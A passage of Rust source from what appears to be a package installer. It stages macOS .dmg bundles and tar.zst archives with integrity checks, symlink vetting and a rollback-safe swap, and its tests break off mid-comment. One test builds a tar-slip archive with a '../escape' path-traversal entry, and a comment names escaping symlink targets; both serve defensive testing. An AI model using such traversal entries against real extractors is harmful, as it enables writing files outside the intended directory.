/// `<tool> failed (exit N): <reason>` — the LAST stderr line is where hdiutil and ditto
/// put the reason (`hdiutil: attach failed - Resource temporarily unavailable`), which
/// is why neither is run under `-quiet`'s suppression of it.
#[cfg(target_os = "macos")]
fn tool_failed(tool: &str, code: Option<i32>, stderr: &[u8]) -> StageError {
    let mut m = String::from(tool);
    m.push_str(" failed");
    if let Some(code) = code {
        m.push_str(" (exit ");
        m.push_str(&crate::dec_u64(u64::from(code.unsigned_abs())));
        m.push(')');
    }
    let stderr = String::from_utf8_lossy(stderr);
    let tail = stderr.trim();
    if !tail.is_empty() {
        m.push_str(": ");
        m.push_str(tail.lines().last().unwrap_or(tail));
    }
    StageError::Payload(m)
}

/// Run `/usr/bin/<tool>` to completion with no stdin and return its stdout; a
/// non-zero exit is the same [`StageError::Payload`] [`run_tool`] reports.
#[cfg(target_os = "macos")]
fn capture_tool(tool: &str, args: &[&std::ffi::OsStr]) -> Result<String, StageError> {
    let mut path = String::from("/usr/bin/");
    path.push_str(tool);
    let out = std::process::Command::new(&path)
        .args(args)
        .stdin(std::process::Stdio::null())
        .output()
        .map_err(StageError::Io)?;
    if !out.status.success() {
        return Err(tool_failed(tool, out.status.code(), &out.stderr));
    }
    Ok(String::from_utf8_lossy(&out.stdout).into_owned())
}

/// One image as `hdiutil info` reports it: the device node to eject it by (the FIRST
/// `/dev/` entity of the block, which is the image's own node — ejecting it tears the
/// synthesised APFS container down with it) and where each of its entities is mounted.
#[cfg(target_os = "macos")]
struct AttachedImage {
    image: PathBuf,
    node: PathBuf,
    mounted_at: Vec<PathBuf>,
}

/// Parse `hdiutil info`'s plain-text report into one [`AttachedImage`] per attached
/// image. The format is stable and simple: a `====…` rule separates the blocks, `key :
/// value` lines carry `image-path`, and every entity is a TAB-separated
/// `<dev-entry>\t<content-hint>[\t<mount-point>]` line whose third field is present only
/// while that entity is mounted. A block with no `/dev/` entity (an image being attached
/// at this instant) is skipped: there is nothing to eject.
///
/// Kept a PURE function over the text so the carcass shape that motivated it is
/// pinned on any machine, hdiutil or no hdiutil
/// (`a_failed_attach_leaves_a_carcass_the_hdiutil_report_names`).
#[cfg(target_os = "macos")]
fn parse_hdiutil_info(report: &str) -> Vec<AttachedImage> {
    let mut out: Vec<AttachedImage> = Vec::new();
    let mut block: Vec<&str> = Vec::new();
    for line in report.lines() {
        if line.starts_with("====") {
            out.extend(parse_hdiutil_block(&block));
            block.clear();
        } else {
            block.push(line);
        }
    }
    out.extend(parse_hdiutil_block(&block));
    out
}

/// One `hdiutil info` block; `None` unless it names an image AND lists a device.
#[cfg(target_os = "macos")]
fn parse_hdiutil_block(lines: &[&str]) -> Option<AttachedImage> {
    let mut image: Option<PathBuf> = None;
    let mut node: Option<PathBuf> = None;
    let mut mounted_at: Vec<PathBuf> = Vec::new();
    for line in lines {
        if let Some(rest) = line.strip_prefix("/dev/") {
            let mut fields = rest.split('\t');
            let dev = fields.next().unwrap_or("").trim();
            if node.is_none() && !dev.is_empty() {
                let mut n = String::from("/dev/");
                n.push_str(dev);
                node = Some(PathBuf::from(n));
            }
            // Field 3 is the mount point while the entity is mounted; absent or empty
            // otherwise. It may contain spaces (`/Volumes/aterm 0.81.0`), never a tab.
            if let Some(point) = fields.nth(1).map(str::trim).filter(|p| !p.is_empty()) {
                mounted_at.push(PathBuf::from(point));
            }
        } else if let Some((key, value)) = line.split_once(':')
            && key.trim() == "image-path"
        {
            image = Some(PathBuf::from(value.trim()));
        }
    }
    Some(AttachedImage {
        image: image?,
        node: node?,
        mounted_at,
    })
}

/// Whether two paths name the same file. `hdiutil info` echoes the path the attaching
/// process passed, so the literal comparison is the one that usually fires; the
/// canonical one covers a symlinked temp dir (`/var/folders` vs `/private/var/folders`)
/// or a relative path on either side.
#[cfg(target_os = "macos")]
fn same_file(a: &Path, b: &Path) -> bool {
    a == b
        || match (a.canonicalize(), b.canonicalize()) {
            (Ok(x), Ok(y)) => x == y,
            _ => false,
        }
}

/// An attached disk image, detached on EVERY path (`Drop` for the error paths, an
/// explicit [`Mount::detach`] on the happy path so a detach failure is reported
/// rather than swallowed). The mount point directory is removed with it.
///
/// The guard is armed BEFORE `hdiutil attach` runs, not after it succeeds, because a
/// non-zero `attach` does not mean nothing was attached. On this machine `attach` fails
/// with `Resource temporarily unavailable` in roughly one attempt in five under
/// back-to-back attach/detach traffic, and each of those failures leaves the image's
/// `/dev/disk*` entities behind with nothing mounted on them — devices that survive for
/// the life of the boot and make the NEXT attach of the same image fail `Resource busy`.
#[cfg(target_os = "macos")]
struct Mount {
    image: PathBuf,
    point: PathBuf,
    /// `hdiutil attach` has been SPAWNED for this image: the guard owes a detach
    /// whatever the exit status claimed.
    attached: bool,
}

/// How many times `hdiutil attach` is attempted before the stage gives up. The failure
/// it exists for is a transient `Resource temporarily unavailable` — measured at 5
/// failures in 20 attaches on an idle Mac, every one of which succeeded on the next
/// attempt once the failed attempt's devices had been reclaimed. A genuinely bad image
/// costs this many attach attempts and no more.
#[cfg(target_os = "macos")]
const ATTACH_ATTEMPTS: u32 = 4;

#[cfg(target_os = "macos")]
impl Mount {
    /// `hdiutil attach -nobrowse -readonly -noverify -noautoopen -mountpoint <point>
    /// <image>`: not in Finder, never written, no second checksum pass (the download's
    /// sha256 gate already ran over these bytes), nothing auto-opened. With stdin closed
    /// an image that demands a license click fails instead of hanging.
    ///
    /// NOT `-quiet`: that flag suppresses the failure line too, which turns every
    /// diagnosable refusal into a bare `hdiutil failed (exit 1)`. Its stdout (the device
    /// table) is captured and dropped by [`run_tool`] either way.
    ///
    /// A failed attempt is reclaimed ([`Mount::detach_now`]) and retried, up to
    /// [`ATTACH_ATTEMPTS`].
    fn attach(image: &Path, dest: &Path) -> Result<Self, StageError> {
        let point = dmg_mount_point(dest)?;
        // An EMPTY leftover from a crashed run is ours; a live mount there refuses the
        // `remove_dir` and then refuses the attach below, which is the right outcome.
        let _ = std::fs::remove_dir(&point);
        std::fs::create_dir_all(&point).map_err(StageError::Io)?;
        let mut last: Option<StageError> = None;
        for _ in 0..ATTACH_ATTEMPTS {
            let mut m = Mount {
                image: image.to_path_buf(),
                point: point.clone(),
                attached: true,
            };
            match run_tool(
                "hdiutil",
                &[
                    "attach".as_ref(),
                    "-nobrowse".as_ref(),
                    "-readonly".as_ref(),
                    "-noverify".as_ref(),
                    "-noautoopen".as_ref(),
                    "-mountpoint".as_ref(),
                    m.point.as_os_str(),
                    image.as_os_str(),
                ],
            ) {
                Ok(()) => return Ok(m),
                Err(e) => {
                    // Reclaim whatever the failed attempt left attached before trying
                    // again: otherwise the retry meets our own carcass as `Resource
                    // busy` and the devices leak for the life of the boot.
                    let _ = m.detach_now();
                    last = Some(e);
                }
            }
        }
        let _ = std::fs::remove_dir(&point);
        Err(last.unwrap_or_else(|| {
            StageError::Payload(String::from("hdiutil attach was never attempted"))
        }))
    }

    /// The ONE `.app` directory at the image root. Anything else there (`Applications`
    /// link, `.background`, `.DS_Store`, a README) is ignored; zero or several apps is
    /// a refusal — the row said which bundle to stage by saying there is one.
    fn single_app(&self) -> Result<PathBuf, StageError> {
        let mut apps: Vec<PathBuf> = Vec::new();
        for entry in std::fs::read_dir(&self.point)
            .map_err(StageError::Io)?
            .flatten()
        {
            let path = entry.path();
            let is_app = path
                .extension()
                .is_some_and(|e| e.eq_ignore_ascii_case("app"));
            // A real directory, not a link to one.
            if is_app && std::fs::symlink_metadata(&path).is_ok_and(|m| m.is_dir()) {
                apps.push(path);
            }
        }
        apps.sort();
        if apps.len() == 1 {
            return Ok(apps.swap_remove(0));
        }
        Err(payload2(
            "dmg image root must hold exactly one .app, found ",
            &crate::dec_u64(apps.len() as u64),
        ))
    }

    fn detach_now(&mut self) -> Result<(), StageError> {
        if !self.attached {
            return Ok(());
        }
        self.attached = false;
        let by_point = run_tool(
            "hdiutil",
            &["detach".as_ref(), "-quiet".as_ref(), self.point.as_os_str()],
        );
        let r = match by_point {
            Ok(()) => Ok(()),
            // Either nothing is mounted at our point (an `attach` that exited non-zero
            // after attaching the devices) or something still holds a file open on the
            // image (Spotlight is the usual culprit). Ask the system which devices this
            // image actually has, and eject those.
            Err(_) => self.eject_own_devices(),
        };
        let _ = std::fs::remove_dir(&self.point);
        r
    }

    /// Eject every device `hdiutil info` still lists for THIS image, and PROVE it worked
    /// by re-reading the report.
    ///
    /// Only an attachment that is wholly unmounted, or mounted nowhere but our own mount
    /// point, is ejected. `-mountpoint` puts OUR mount at our point and nowhere else, so
    /// an attachment mounted elsewhere cannot be ours — it is the user's own copy, not
    /// ours to yank, and reporting nothing left behind is the true answer rather than a
    /// silent miss. That is also the right reading of a `Resource busy` attach failure
    /// against a copy the user already has open: a refusal worth reporting, not papering
    /// over.
    fn eject_own_devices(&self) -> Result<(), StageError> {
        let nodes = self.own_devices()?;
        if nodes.is_empty() {
            return Ok(());
        }
        let mut last: Option<StageError> = None;
        for node in &nodes {
            if run_tool(
                "hdiutil",
                &["detach".as_ref(), "-quiet".as_ref(), node.as_os_str()],
            )
            .is_ok()
            {
                continue;
            }
            if let Err(e) = run_tool(
                "hdiutil",
                &[
                    "detach".as_ref(),
                    "-force".as_ref(),
                    "-quiet".as_ref(),
                    node.as_os_str(),
                ],
            ) {
                last = Some(e);
            }
        }
        if self.own_devices()?.is_empty() {
            return Ok(());
        }
        Err(last.unwrap_or_else(|| {
            payload2(
                "hdiutil could not detach the image: ",
                &crate::call1(std::path::Path::to_string_lossy, &self.image),
            )
        }))
    }

    /// The device nodes `hdiutil info` lists for this image that are ours to eject
    /// (see [`Mount::eject_own_devices`]).
    fn own_devices(&self) -> Result<Vec<PathBuf>, StageError> {
        let report = capture_tool("hdiutil", &["info".as_ref()])?;
        Ok(self.reclaimable(&report))
    }

    /// The device nodes an `hdiutil info` report holds for this image that are ours to
    /// eject. Split out from [`Mount::own_devices`] so the rule is a pure function of
    /// the report text and a test can state it without a disk image.
    fn reclaimable(&self, report: &str) -> Vec<PathBuf> {
        parse_hdiutil_info(report)
            .into_iter()
            .filter(|a| same_file(&a.image, &self.image))
            .filter(|a| a.mounted_at.iter().all(|p| same_file(p, &self.point)))
            .map(|a| a.node)
            .collect()
    }

    /// Detach and report. Consumes the guard so `Drop` has nothing left to do.
    fn detach(mut self) -> Result<(), StageError> {
        self.detach_now()
    }
}

#[cfg(target_os = "macos")]
impl Drop for Mount {
    fn drop(&mut self) {
        let _ = self.detach_now();
    }
}

/// The `dmg` lane: attach the image read-only, require exactly one `.app` at its
/// root, `ditto` that bundle into `dest` (modes, symlinks and extended attributes
/// preserved, as Finder would), refuse any link in it that leaves the stage root
/// ([`vet_copied_tree`]), detach. Nothing else on the image is copied and nothing on
/// it is executed.
#[cfg(target_os = "macos")]
fn stage_dmg(image: &Path, dest: &Path) -> Result<(), StageError> {
    std::fs::create_dir_all(dest).map_err(StageError::Io)?;
    crate::extract::require_empty_destination(dest).map_err(StageError::Extract)?;
    let mount = Mount::attach(image, dest)?;
    let app = mount.single_app()?;
    let name = crate::call1(std::path::Path::file_name, &app).ok_or_else(|| {
        payload2(
            "dmg bundle has no name: ",
            &crate::call1(std::path::Path::to_string_lossy, &app),
        )
    })?;
    let out = dest.join(name);
    run_tool("ditto", &[app.as_os_str(), out.as_os_str()])?;
    // `ditto` laid the bundle VERBATIM, links included, with nothing of ours vetting
    // them on the way — so vet them now, before the mount is released and long before
    // the swap: the archive lanes' in-root rule, applied to the finished copy.
    if let Err(e) = vet_copied_tree(dest, &out) {
        let _ = mount.detach();
        return Err(e);
    }
    mount.detach()
}

/// Every SYMLINK under `dir` (the copied `.app`) must resolve LEXICALLY inside the
/// stage `root` — the rule the archive lanes enforce per entry
/// ([`crate::extract::vet_symlink`]), applied after the fact because `ditto` preserves
/// links as the image carries them. An image whose bundle holds
/// `Contents/MacOS/x -> /usr/bin/x` or `-> ../../../..` would otherwise sit in a tree
/// the digest describes only by target bytes, and a `links` target or a shim could then
/// resolve through it to somewhere outside the store. Anything that is not a file, a
/// directory or a symlink is refused as well (the walk would refuse it at the re-verify,
/// but saying which entry is better than a bare mismatch).
#[cfg(target_os = "macos")]
fn vet_copied_tree(root: &Path, dir: &Path) -> Result<(), StageError> {
    for entry in std::fs::read_dir(dir).map_err(StageError::Io)? {
        let entry = entry.map_err(StageError::Io)?;
        let path = entry.path();
        // `DirEntry::file_type` never follows a link.
        let ft = entry.file_type().map_err(StageError::Io)?;
        if ft.is_symlink() {
            let rel = path.strip_prefix(root).map_err(|_| {
                StageError::Extract(ExtractError::Rejected(
                    crate::extract::ExtractReject::RootEscape,
                    path.clone(),
                ))
            })?;
            let target = std::fs::read_link(&path).map_err(StageError::Io)?;
            crate::extract::vet_symlink(root, rel, &target, 0)
                .map_err(|r| StageError::Extract(ExtractError::Rejected(r, rel.to_path_buf())))?;
        } else if ft.is_dir() {
            vet_copied_tree(root, &path)?;
        } else if !ft.is_file() {
            return Err(payload2(
                "dmg bundle carries an entry that is not a file, directory or symlink: ",
                &crate::call1(std::path::Path::to_string_lossy, &path),
            ));
        }
    }
    Ok(())
}

/// `dmg` needs `hdiutil` and `ditto`; off macOS the lane fails closed.
#[cfg(not(target_os = "macos"))]
fn stage_dmg(_image: &Path, _dest: &Path) -> Result<(), StageError> {
    Err(StageError::Payload(String::from(
        "dmg payloads can only be staged on macOS (hdiutil/ditto)",
    )))
}

/// Whether [`DISK_REVERIFY_ENV`] arms the on-disk cross-check. Read here, passed DOWN as a
/// bool, so the decision is one env lookup per stage and [`reverified_root`] stays a pure
/// function two tests can drive both ways without mutating process-global state (which
/// `std::env::set_var` is `unsafe` for in edition 2024, and is a data race under a
/// multi-threaded test runner regardless).
fn disk_reverify_armed() -> bool {
    aterm_types::dev_seam!(DISK_REVERIFY_ENV).is_some_and(|v| !v.is_empty())
}

/// The root step 3 compares against the signed value: the one the extractor folded, or —
/// when [`DISK_REVERIFY_ENV`] is armed — that root AND a full on-disk
/// [`crate::tree::tree_root`] walk, which must agree.
///
/// Disagreement is an ERROR, never a silent preference for one of them: two producers of a
/// cross-version byte contract that differ over the same tree is exactly the condition a
/// fail-closed stage exists for, and the message names both so the drift is diagnosable
/// rather than merely fatal.
fn reverified_root(
    incoming: &Path,
    extracted_root: String,
    armed: bool,
) -> std::io::Result<String> {
    if !armed {
        return Ok(extracted_root);
    }
    let walked = tree_root(incoming)?;
    if !walked.eq_ignore_ascii_case(&extracted_root) {
        let mut msg = String::from("staged tree_root disagreement: the extraction folded ");
        msg.push_str(&extracted_root);
        msg.push_str(" but the on-disk walk read ");
        msg.push_str(&walked);
        return Err(std::io::Error::new(std::io::ErrorKind::InvalidData, msg));
    }
    Ok(walked)
}

/// Move `incoming` onto `build_dir`, retiring whatever was there.
///
/// The ordering is the whole point, so it is spelled out rather than inlined:
///
/// 1. `clear_build_ready` — from here until step 5 of the caller the build is not
///    complete, and every reader agrees with that.
/// 2. `build_dir` → `<build>.superseded-<pid>` (skipped when nothing is installed).
/// 3. `incoming` → `build_dir`. If THIS fails, the old tree is moved back: a stage that
///    cannot install the new build must not have uninstalled the old one.
/// 4. the superseded tree is reclaimed.
///
/// Both renames restore the marker on failure when the outgoing tree was complete before
/// the call. That is not cosmetic bookkeeping: the marker is the ONLY thing that makes a
/// tree visible to `list_installed`, so leaving a perfectly good toolchain unmarked
/// downgrades "the update did not happen" into "re-download and re-extract gigabytes".
fn swap_into_place(build_dir: &Path, incoming: &Path) -> std::io::Result<()> {
    // Whether the tree we are replacing was itself complete decides what a rollback may
    // claim about it: re-marking a tree that was NEVER complete would promote a crash
    // leftover to "installed" on the way out of an unrelated failure.
    let was_complete = crate::store::build_is_complete(build_dir);
    crate::store::clear_build_ready(build_dir)?;
    if let Some(parent) = build_dir.parent() {
        crate::store::sync_dir(parent);
    }
    let superseded = crate::store::superseded_dir(build_dir);
    let retired = match superseded {
        Some(ref old) if build_dir.exists() => {
            let _ = std::fs::remove_dir_all(old);
            if let Err(e) = std::fs::rename(build_dir, old) {
                // The swap could not even BEGIN. A rename that returns an error has not
                // moved anything, so the old tree is provably still at `build_dir`,
                // exactly as complete as it was one line ago; the marker we just took down
                // is the only thing that changed, and re-marking asserts nothing new.
                if was_complete {
                    let _ = crate::store::mark_build_ready(build_dir);
                }
                return Err(e);
            }
            true
        }
        _ => false,
    };
    if let Err(e) = std::fs::rename(incoming, build_dir) {
        // Put the old build back before reporting the failure — a rollback here is the
        // difference between "the update did not happen" and "the toolchain is gone".
        if retired && let Some(ref old) = superseded {
            restore_outgoing(old, build_dir, was_complete);
        }
        return Err(e);
    }
    if retired && let Some(ref old) = superseded {
        let _ = std::fs::remove_dir_all(old);
    }
    Ok(())
}

/// Move the parked outgoing tree back to `build_dir` and, only if it was complete BEFORE the
/// swap, re-mark it. `true` when the tree really came back.
///
/// The `was_complete` guard and the restore guard are two different questions and both have
/// to be asked. [`crate::store::mark_build_ready`] has no existence precondition — it writes
/// a temp file beside the build and renames it onto `<build>.ready` without ever looking at
/// `<build>` — so re-marking after a restore that FAILED writes a completeness marker for a
/// tree that is not there. Nothing believes such a marker today (every reader of
/// `build_is_complete` enumerates directories first), and nothing reclaims it either, so it
/// would sit there as a durable lie one refactor away from being believed.
fn restore_outgoing(old: &Path, build_dir: &Path, was_complete: bool) -> bool {
    if std::fs::rename(old, build_dir).is_err() {
        return false;
    }
    if was_complete {
        let _ = crate::store::mark_build_ready(build_dir);
    }
    true
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::manifest::{Artifact, Cost};
    use crate::tree::tree_root;
    use std::io::Write;
    use std::path::PathBuf;

    fn tmp(label: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("atpkg-install-{label}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    /// One raw USTAR header + padded body for a regular file.
    fn tar_entry(name: &str, content: &[u8]) -> Vec<u8> {
        let mut h = [0u8; 512];
        let nb = name.as_bytes();
        h[..nb.len()].copy_from_slice(nb);
        h[100..108].copy_from_slice(b"0000644\0");
        h[108..116].copy_from_slice(b"0000000\0");
        h[116..124].copy_from_slice(b"0000000\0");
        h[124..136].copy_from_slice(format!("{:011o}\0", content.len()).as_bytes());
        h[136..148].copy_from_slice(b"00000000000\0");
        h[148..156].copy_from_slice(b"        ");
        h[156] = b'0';
        h[257..263].copy_from_slice(b"ustar\0");
        h[263..265].copy_from_slice(b"00");
        let sum: u32 = h.iter().map(|&b| u32::from(b)).sum();
        h[148..156].copy_from_slice(format!("{sum:06o}\0 ").as_bytes());

        let mut out = h.to_vec();
        out.extend_from_slice(content);
        out.resize(out.len() + (512 - content.len() % 512) % 512, 0);
        out
    }

    /// zstd-compress a raw tar stream (plus its two zero end-of-archive blocks) to `path`.
    fn seal(path: PathBuf, mut tar: Vec<u8>) -> PathBuf {
        tar.resize(tar.len() + 1024, 0);
        let f = std::fs::File::create(&path).unwrap();
        let mut enc = zstd::Encoder::new(f, 0).unwrap();
        enc.write_all(&tar).unwrap();
        enc.finish().unwrap();
        path
    }

    /// A minimal raw USTAR + zstd archive with one regular file `bin/ay`.
    fn make_archive(dir: &Path) -> PathBuf {
        seal(
            dir.join("ay-18.tar.zst"),
            tar_entry("bin/ay", b"#!/bin/true\nthe ay binary"),
        )
    }

    /// An archive whose EXTRACTION fails part-way: a good first entry (so real bytes land in
    /// the staging tree and the extractor is genuinely mid-flight), then a `../escape` entry
    /// that [`crate::extract::vet_entry`] refuses as a tar-slip.
    ///
    /// Its own sha256 is whatever it is — the caller signs THAT value, so the download-
    /// integrity gate passes and the failure lands where this test needs it: in step 2.
    fn make_slip_archive(dir: &Path) -> PathBuf {
        let mut tar = tar_entry("bin/ay", b"a plausible first entry");
        tar.extend(tar_entry("../escape", b"pwned"));
        seal(dir.join("slip-18.tar.zst"), tar)
    }

    fn artifact(sha256: &str, tree_root: &str) -> Artifact {
        Artifact {
            target: "aarch64-apple-darwin".into(),
            kind: "binary".into(),
            asset: "ay-18.tar.zst".into(),
            sha256: sha256.into(),
            tree_root: tree_root.into(),
            size: 0,
            reloc: "self-contained".into(),
            cost: Cost {
                download_bytes: 0,
                disk_installed: 1 << 20,
                build_seconds: 0,
            },
            url: String::new(),
            payload: String::new(),
            entry: String::new(),
            strip_components: 0,
            links: std::collections::BTreeMap::new(),
            vendor: String::new(),
            protocol: "github-release".into(),
        }
    }

    /// The three facts every staging test needs: a scratch root, a good archive, and the
    /// artifact whose sha256 + tree_root HONESTLY describe that archive.
    ///
    /// The tree_root is learned by extracting once through the same extractor the real stage
    /// uses, not by asking `verify_and_stage` for it — a fixture that got its expected value
    /// out of the function under test can be satisfied by a function that checks nothing.
    struct Bundle {
        dir: PathBuf,
        archive: PathBuf,
        art: Artifact,
    }

    fn bundle(label: &str) -> Bundle {
        let dir = tmp(label);
        let archive = make_archive(&dir);
        let sha = file_sha256(&archive).unwrap();
        let probe = dir.join("probe");
        // NOTE — this fixture is a live DIFFERENTIAL, not just a fixture. The expected
        // `tree_root` is learned by walking the extracted tree ON DISK, while
        // `verify_and_stage` compares against the root the extractor FOLDS as it writes.
        // Every staging test below therefore fails the moment the two producers of that
        // cross-version byte contract disagree over this bundle — hardlinks, modes, empty
        // files and all — on top of the exhaustive corpus in `extract.rs`.
        crate::extract::extract_tar_zst(&archive, &probe, 1 << 20, 1000).unwrap();
        let root = tree_root(&probe).unwrap();
        std::fs::remove_dir_all(&probe).unwrap();
        assert_eq!(root.len(), 64, "the fixture must carry a real tree_root");
        Bundle {
            dir,
            archive,
            art: artifact(&sha, &root),
        }
    }

    impl Bundle {
        /// `store/ay/18` under this bundle's scratch root.
        fn build(&self) -> PathBuf {
            self.dir.join("store/ay/18")
        }

        /// Install build 18 for real, through the real stage, and leave a witness file inside
        /// the installed tree. Returns `(build_dir, witness)`.
        ///
        /// The witness is how every "the old build survived" assertion below distinguishes
        /// *this* tree from a replacement that merely happens to contain the same files.
        fn installed(&self) -> (PathBuf, PathBuf) {
            let build = self.build();
            verify_and_stage(&self.art, &self.archive, &build, &StageHooks::NONE).unwrap();
            assert!(
                crate::store::build_is_complete(&build),
                "the fixture is only interesting once the build is really installed"
            );
            let witness = build.join("this-tree-survived");
            std::fs::write(&witness, b"old").unwrap();
            (build, witness)
        }
    }

    /// Every stage-scratch sibling currently sitting beside `build_dir`.
    fn scratch_beside(build_dir: &Path) -> Vec<String> {
        let Some(parent) = build_dir.parent() else {
            return Vec::new();
        };
        let Ok(entries) = std::fs::read_dir(parent) else {
            return Vec::new();
        };
        let mut out: Vec<String> = entries
            .flatten()
            .filter_map(|e| e.file_name().to_str().map(str::to_string))
            .filter(|n| n.contains(".incoming-") || n.contains(".superseded-"))
            .collect();
        out.sort();
        out
    }

    // Happy path: correct sha256 + correct tree_root ⇒ the tree is staged.
    #[test]
    fn verifies_and_stages_a_good_bundle() {
        let b = bundle("good");
        let build = b.build();
        verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();
        assert_eq!(
            std::fs::read(build.join("bin/ay")).unwrap(),
            b"#!/bin/true\nthe ay binary"
        );
        assert!(crate::store::build_is_complete(&build));
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    // A wrong (compressed) sha256 is refused before extraction; nothing is staged.
    #[test]
    fn rejects_sha256_mismatch() {
        let b = bundle("badsha");
        let build = b.build();
        let err = verify_and_stage(
            &artifact("deadbeef", ""),
            &b.archive,
            &build,
            &StageHooks::NONE,
        )
        .unwrap_err();
        assert!(
            matches!(err, StageError::Sha256Mismatch { .. }),
            "got {err:?}"
        );
        assert!(
            !build.exists(),
            "nothing should be staged on a sha mismatch"
        );
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    // A wrong tree_root (TOCTOU / tamper) aborts and removes the partial stage.
    #[test]
    fn rejects_tree_root_mismatch_and_cleans_up() {
        let b = bundle("badroot");
        let build = b.build();
        let bad = artifact(&b.art.sha256, &"a".repeat(64));
        let err = verify_and_stage(&bad, &b.archive, &build, &StageHooks::NONE).unwrap_err();
        assert!(
            matches!(err, StageError::TreeRootMismatch { .. }),
            "got {err:?}"
        );
        assert!(
            !build.exists(),
            "a tree_root mismatch must remove the partial stage"
        );
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    /// THE GOVERNING INVARIANT, at the step that used to destroy the toolchain first: a
    /// stage whose EXTRACTION fails must not have uninstalled the old build.
    ///
    /// The old shape was `remove_dir_all(build_dir)` → extract, so the live tree was already
    /// gone by the time the extractor read its first entry. A bad archive, a full disk or a
    /// ^C anywhere after that left the user with no toolchain at all — while the SIBLING
    /// `<build>.ready` marker, which the delete never touched, still claimed the build was
    /// installed. Here the archive's first entry extracts fine and its second is a tar-slip:
    /// real bytes are written, then the stage aborts, and the installed build is untouched.
    #[test]
    fn a_failed_extraction_leaves_the_installed_build_intact_and_complete() {
        let b = bundle("extract-fail");
        let (build, witness) = b.installed();

        // A DIFFERENT archive, correctly signed for its own bytes, so the sha256 gate passes
        // and the failure lands in extraction rather than before it.
        let slip = make_slip_archive(&b.dir);
        let slip_art = artifact(&file_sha256(&slip).unwrap(), "");

        let err = verify_and_stage(&slip_art, &slip, &build, &StageHooks::NONE).unwrap_err();
        assert!(
            matches!(err, StageError::Extract(_)),
            "the fixture must fail IN extraction, else this proves nothing: got {err:?}"
        );
        assert!(
            witness.exists() && std::fs::read(&witness).unwrap() == b"old",
            "the previously-installed tree was destroyed by a stage that then failed"
        );
        assert_eq!(
            std::fs::read(build.join("bin/ay")).unwrap(),
            b"#!/bin/true\nthe ay binary",
            "the old tree's contents must be the OLD ones, not the aborted extract's"
        );
        assert!(
            crate::store::build_is_complete(&build),
            "the surviving build must still be marked complete"
        );
        assert!(
            !build.parent().unwrap().join("escape").exists(),
            "the slip entry must not have escaped either"
        );
        assert!(scratch_beside(&build).is_empty(), "and no scratch leaked");
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    /// The same invariant one step later: a tree_root mismatch — tamper, or a truncated
    /// extract that still parsed — aborts AFTER the whole tree is on disk, the latest point
    /// at which the old shape had already destroyed the live one.
    #[test]
    fn a_failed_re_stage_leaves_the_installed_build_untouched() {
        let b = bundle("restage-fail");
        let (build, witness) = b.installed();

        let bad = artifact(&b.art.sha256, &"a".repeat(64));
        let err = verify_and_stage(&bad, &b.archive, &build, &StageHooks::NONE).unwrap_err();
        assert!(
            matches!(err, StageError::TreeRootMismatch { .. }),
            "got {err:?}"
        );
        assert!(
            witness.exists(),
            "the previously-installed tree was destroyed by a stage that then failed"
        );
        assert_eq!(std::fs::read(&witness).unwrap(), b"old");
        assert!(
            crate::store::build_is_complete(&build),
            "the surviving build must still be marked complete"
        );
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    /// A successful re-stage REPLACES the tree (the witness from the old tree is gone) and
    /// the build is complete again — the swap is not a no-op that leaves stale bytes.
    #[test]
    fn a_successful_re_stage_replaces_the_tree_and_re_marks_it() {
        let b = bundle("restage-ok");
        let (build, witness) = b.installed();

        verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();
        assert!(
            !witness.exists(),
            "the swap must install the NEW tree, not merge into the old one"
        );
        assert_eq!(
            std::fs::read(build.join("bin/ay")).unwrap(),
            b"#!/bin/true\nthe ay binary"
        );
        assert!(crate::store::build_is_complete(&build));
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    /// No stage — successful or failed — may leave scratch behind. Scratch is invisible to
    /// `list_installed` (non-numeric name) and so, historically, to every reclaim path.
    #[test]
    fn no_stage_leaves_scratch_siblings_behind() {
        let b = bundle("scratch");
        let build = b.build();

        verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();
        assert!(
            scratch_beside(&build).is_empty(),
            "after success: {:?}",
            scratch_beside(&build)
        );
        let bad = artifact(&b.art.sha256, &"b".repeat(64));
        let _ = verify_and_stage(&bad, &b.archive, &build, &StageHooks::NONE).unwrap_err();
        assert!(
            scratch_beside(&build).is_empty(),
            "after failure: {:?}",
            scratch_beside(&build)
        );
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    /// Scratch left by a KILLED earlier run is swept by the next stage of that build —
    /// the process that owned it cannot come back (every mutating verb holds the store
    /// lock), so its debris is ours to reclaim.
    #[test]
    fn a_new_stage_sweeps_scratch_left_by_a_killed_run() {
        let b = bundle("sweep");
        let build = b.build();
        std::fs::create_dir_all(build.parent().unwrap()).unwrap();
        // A half-extracted tree from a run that never finished.
        let orphan = build.with_file_name("18.incoming-999999");
        std::fs::create_dir_all(orphan.join("bin")).unwrap();
        std::fs::write(orphan.join("bin/half"), b"partial").unwrap();
        assert!(orphan.exists(), "the fixture starts with debris on disk");

        verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();
        assert!(!orphan.exists(), "the orphaned scratch was not swept");
        assert!(crate::store::build_is_complete(&build));
        assert!(scratch_beside(&build).is_empty());
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    /// A SWAP THAT CANNOT EVEN BEGIN MUST PUT THE MARKER BACK.
    ///
    /// `swap_into_place` takes the completeness marker down first, because for the duration
    /// of the swap the build honestly is not complete. If the very first rename then fails,
    /// the old tree has not moved an inch — but without restoring the marker it now reads as
    /// "not installed" to `list_installed`, `decide` and every reclaim path, so a working
    /// toolchain gets re-downloaded and re-extracted for nothing.
    ///
    /// The failure is induced the only way that is portable and needs no hook: a regular FILE
    /// occupies the `<build>.superseded-<pid>` path, and renaming a directory onto a
    /// non-directory fails.
    ///
    /// Driven through `swap_into_place` rather than `verify_and_stage`, because the stage's
    /// own `sweep_stage_scratch` now RECLAIMS a stray non-directory at a scratch path (it
    /// used to leak there forever, reclaimable by neither sweeper) and so clears this
    /// blocker before the swap ever sees it. That is the better behaviour and it is asserted
